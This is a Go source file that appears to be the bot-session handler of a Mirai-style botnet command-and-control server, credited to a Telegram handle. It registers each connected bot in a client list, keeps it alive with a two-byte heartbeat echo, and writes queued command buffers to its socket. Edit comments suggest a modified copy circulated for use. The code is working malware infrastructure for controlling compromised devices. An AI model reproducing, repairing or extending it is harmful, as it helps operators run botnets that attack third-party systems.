// @anessdev on telegram

package main

import (
    "net"
    "time"
)

type Bot struct {
    uid                  int
    conn                 net.Conn
    version              byte
    source               string
    markedForReplacement bool
    sendBuf              chan []byte // Added to support non-blocking sends from worker
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    // Fixed: Corrected struct literal with all fields and initialized channel
    return &Bot{
        uid:                  -1,
        conn:                 conn,
        version:              version,
        source:               source,
        markedForReplacement: false,
        sendBuf:              make(chan []byte, 128),
    }
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    // Heartbeat/Sync Loop
    // This bot version uses a simple read/write heartbeat
    go func() {
        buf := make([]byte, 2)
        for {
            this.conn.SetDeadline(time.Now().Add(180 * time.Second))
            if n, err := this.conn.Read(buf); err != nil || n != len(buf) {
                return
            }
            if n, err := this.conn.Write(buf); err != nil || n != len(buf) {
                return
            }
        }
    }()

    // Bot Command Loop
    // Listen for buffers on the sendBuf channel and write them to the socket
    for buf := range this.sendBuf {
        this.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
        if _, err := this.conn.Write(buf); err != nil {
            return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    // Fallback helper
    select {
    case this.sendBuf <- buf:
    default:
    }
}